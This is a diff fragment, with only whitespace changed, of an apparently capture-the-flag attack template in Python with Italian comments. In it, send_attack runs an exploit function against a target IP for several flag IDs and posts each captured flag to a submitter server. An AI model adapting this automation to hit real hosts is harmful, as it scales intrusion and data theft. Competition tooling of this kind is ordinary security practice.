@@ -11,31 +11,31 @@ def exploit(ip, attribute_1, attribute_2):
 
 #per mandare attacco, modificare solo service, service_attribute_1 e service_attribute_2
 def send_attack(ip, team_id):
-    print(f"Attacco in corso a {ip}\n")
-    service = ""  # servizio
-    service_attribute_1 = ""    # primo argomento flagID
-    service_attribute_2 = ""    # secondo argomento flagID
+    print(f"Attacco in corso a {ip}\n")
+    service = "" # servizio
+    service_attribute_1 = "" # primo argomento flagID
+    service_attribute_2 = "" # secondo argomento flagID
+    
+    results = get_info(team_id, service, service_attribute_1, service_attribute_2) # ritorna una lista di dizionari
 
-    results = get_info(team_id, service, service_attribute_1, service_attribute_2)  # ritorna una lista di dizionari
+    print(results) # debug opzionale
 
-    print(results)  # debug opzionale
+    for i in range(0, 4):
+        if not results[i]: # check se è vuoto
+            continue
 
-    for i in range(0, 4):
-        if not results[i]:  # check se è vuoto
-            continue
+        arg1 = results[i][service_attribute_1]
+        arg2 = results[i][service_attribute_2]
 
-        arg1 = results[i][service_attribute_1]
-        arg2 = results[i][service_attribute_2]
+        flag = exploit(ip, arg1, arg2)
 
-        flag = exploit(ip, arg1, arg2)
+        data = {'flag': flag}
+        response = requests.post(submitter_ip, data=data)
 
-        data = {'flag': flag}
-        response = requests.post(submitter_ip, data=data)
+        print("Status Code:", response.status_code)
+        print("Response Body:", response.text)
 
-        print("Status Code:", response.status_code)
-        print("Response Body:", response.text)
-
-    return
+    return
 
 #funzione per salvare le flag su un file, ma non serve più
 def save_flag(flag):
